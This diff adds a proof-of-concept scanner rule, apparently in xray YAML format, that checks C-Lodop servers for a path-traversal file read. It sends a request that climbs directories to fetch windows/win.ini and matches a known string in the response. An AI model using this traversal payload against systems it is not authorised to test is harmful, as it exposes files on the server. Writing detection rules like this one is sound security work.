@@ -1,0 +1,15 @@
+name: poc-yaml-c-lodop-file-read
+transport: http
+rules:
+    r1:
+        request:
+            method: GET
+            path: "/../../../../../../../../../../../../../../../../../../../../../../../windows/win.ini"
+        expression: |
+            response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+expression:
+    r1()
+detail:
+    author: 凉风(https://github.com/c0olw)
+    links:
+        - https://blog.csdn.net/Trouble_99/article/details/118187603
